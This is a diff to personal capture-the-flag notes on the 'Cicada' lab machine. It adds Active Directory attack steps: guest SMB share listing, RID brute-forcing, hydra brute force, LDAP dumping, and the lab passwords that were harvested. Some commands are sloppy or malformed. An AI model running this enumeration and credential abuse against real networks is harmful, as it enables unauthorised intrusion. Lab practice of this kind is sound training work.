@@ -1,20 +1,6 @@
 IP:10.10.11.35
 
-```bash
-❯ nmap 10.10.11.35
-PORT     STATE SERVICE
-53/tcp   open  domain - DNS # not useful
-88/tcp   open  kerberos-sec - Authentication # probably not useful
-135/tcp  open  msrpc - Microsoft RPC # could be useful
-139/tcp  open  netbios-ssn - NetBIOS Session Service
-389/tcp  open  ldap - Light weight directory access protocol # probalky not useful
-445/tcp  open  microsoft-ds - Microsoft Windows file sharing # protocol used by SMB over IP
-593/tcp  open  http-rpc-epmap - Reverse proxy for RPC
-636/tcp  open  ldapssl - Light weight directory access protocol
-3268/tcp open  globalcatLDAP -  #possible not useful
-3269/tcp open  globalcatLDAPssl #possible not useful
-5985/tcp open  wsman - Web Services for Management
-```
+ldapdomaindump -r 10.10.11.35 -u 'cicada.htb\micheal.wrightson' -p 'Cicada$M6Corpb\*@Lp#nZp\!8'
 
 ```bash
 ❯ sudo nmap -sV --version-intensity 5 10.10.11.35
@@ -40,6 +26,13 @@ Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
 ```
+
+nxc --target 10.10.11.35 --list-shares --username guest --password ""
+nxc --target 10.10.11.35 --username guest --password "" --start-rid 500 --end-rid 550
+
+hydra -L cicada/users.txtusers.txt -P Cicada$M6Corpb\*@Lp#nZp!8 ssh://10.10.11.35
+
+smbclient //IP:10.10.11.35/<share_name> -U <username>
 
 see if this LDAP server is vulnerable to a NULL base or anonymous bind. We will search for all Distinguished Names (DN) in the tree.
 
@@ -227,3 +220,85 @@ smbclient //10.10.11.35/C$ -N
         NETLOGON                                                NO ACCESS        Logon server share
         SYSVOL                                                  NO ACCESS        Logon server share
 ```
+
+```bash
+pipx install git+https://github.com/Pennyw0rth/NetExec
+```
+
+```bash
+❯ nxc smb 10.10.11.35 --username guest --password ""
+
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
+(cicada)
+```
+
+Successfully enumerated users using `netexec smb`:
+
+```bash
+❯ netexec smb 10.10.11.35 --shares -u 'guest' -p '' --rid-brute
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC     f
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV
+SMB         10.10.11.35     445    CICADA-DC        HR              READ
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
+SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+```
+
+The user `michael.wrightson` uses the default password!
+
+smbclient //10.10.11.35/SYSVOL -U 'CICADA\michael.wrightson%Cicada$M6Corpb\*@Lp#nZp!8'
+
+Attempting to map the shares:
+
+```bash
+smbmap -H 10.10.11.35 -u "michael.wrightson" -p "Cicada\$M6Corpb*@Lp#nZp!8"
+```
+
+```bash
+❯ ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -o ./cicadata/out2
+```
+
+Got the password from the description for david.orelious `aRt$Lp#7t*VQ!3`.
+smbclient //10.10.11.35/DEV -U david.orelious
+
+Got password from `Backup_script.ps1` in the DEV share.
+
+`Q!3@Lp#M6b*7t*Vt`
